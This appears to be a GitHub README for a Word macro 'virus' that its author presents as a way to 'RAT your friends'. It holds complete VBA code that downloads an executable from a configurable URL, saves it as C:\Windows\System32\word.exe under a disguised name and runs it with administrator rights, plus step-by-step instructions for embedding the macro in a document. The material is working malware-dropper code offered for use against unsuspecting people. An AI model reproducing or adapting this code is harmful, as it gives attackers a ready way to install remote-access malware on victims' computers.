# Macro Virus

This is a simple Macro Virus I wrote so that you can RAT your friends with a word document. You can view more info below on how to use it and what all the code is doing.

## Code Explanation

Below you can view the full code with commented explanations. Basically all it does is download a file and run it as admin.

```vb
Sub hehe()
   Dim url As String
   Dim filePath As String

   ' Made By Payson - github.com/paysonism '
   
   ' The URL to the virus exe
   url = ""
   
   ' Where to download the file
   filePath = "C:\Windows\System32\word.exe"
   
   Dim http As Object
   Set http = CreateObject("MSXML2.XMLHTTP")
   
   ' Open an HTTP connection to the specified URL
   http.Open "GET", url, False
   
   ' Send the HTTP request
   http.send
   
   Dim stream As Object
   Set stream = CreateObject("ADODB.Stream")
   
   ' Open the stream object
   stream.Open
   
   ' Set the type of the stream to binary
   stream.Type = 1
   
   ' Write the response body from the HTTP request to the stream
   stream.Write http.responseBody
   
   ' Save the contents of the stream to the specified file path
   stream.SaveToFile filePath, 2
   
   ' Close the stream object
   stream.Close
   
   Dim shell As Object
   Set shell = CreateObject("Shell.Application")
   
   ' Run the virus as admin
   shell.ShellExecute filePath, "", "", "runas", 1
   
   ' Cleanup and memory release
   Set http = Nothing
   Set stream = Nothing
   Set shell = Nothing
End Sub
```

## How to use

To use it, simply open a new (or existing) word document. This will differ depending on what version of word you are using so look it up for your specific word version.
These instructions are for **Word 2010**. After opening the document, go to the view tab and then choose view macros. ![image](https://github.com/paysonism/macro-virus/assets/79509967/47e94d6f-da81-49e0-809b-b8b57ba50796)
After you have chosen view macros, enter a name and click create on the new page. ![image](https://github.com/paysonism/macro-virus/assets/79509967/c8d52980-1978-478d-82be-f9ea749f71b7)
Now, there should be a page that opens up with some code. Simply paste the macro.vba code inside of the Sub into your macro and your good to go! ![image](https://github.com/paysonism/macro-virus/assets/79509967/45b17980-6c28-46ff-94f9-8915663e79de)

# Credits

Made By [Payson](https://github.com/paysonism)
